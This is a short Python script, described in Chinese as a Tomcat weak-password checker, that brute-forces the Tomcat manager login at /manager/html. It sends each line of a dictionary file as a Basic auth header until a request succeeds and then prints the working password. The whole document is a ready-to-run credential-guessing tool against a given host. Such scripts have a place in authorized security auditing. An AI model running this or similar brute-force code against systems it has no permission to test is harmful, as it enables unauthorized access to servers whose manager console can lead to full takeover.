'''
    Tomcat弱口令检测脚本,字典文件为tomcat_dic.txt。
                                                --by jammny.
    用法：
        python3 BruteForce.py 192.168.30.131:8080
'''

import requests, base64, sys
from colorama import init, Fore

class Brute():
    def __init__(self, host):
        self.host = 'http://' + host + "/manager/html"
        self.state = 0

    def run(self):
        try:
            for line in open('./dic/tomcat_dic.txt'):
                #print(line.rstrip('\n'))
                password = line.rstrip('\n')
                bytes = base64.b64encode(password.encode('utf-8'))
                bs64_pass = bytes.decode('utf-8')
                headers = {
                    'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
                    'Authorization': 'Basic {}'.format(bs64_pass)
                }
                url = self.host
                res = requests.get(url=url, headers=headers)
                if res.status_code == 200:
                    self.state = 1
                    print(Fore.RED + '[+] Tomcat存在弱口令!（{}）'.format(password))
                    break
            if self.state == 0:
                print(Fore.GREEN + '[-] 未检出出弱口令！')
        except:
            print(Fore.RED + '[-] 无法与目标建立连接！')

def run(host):
    main = Brute(host)
    main.run()

if __name__ ==  '__main__':
    host = sys.argv[1]
    #host = "192.168.30.131:8080"
    run(host)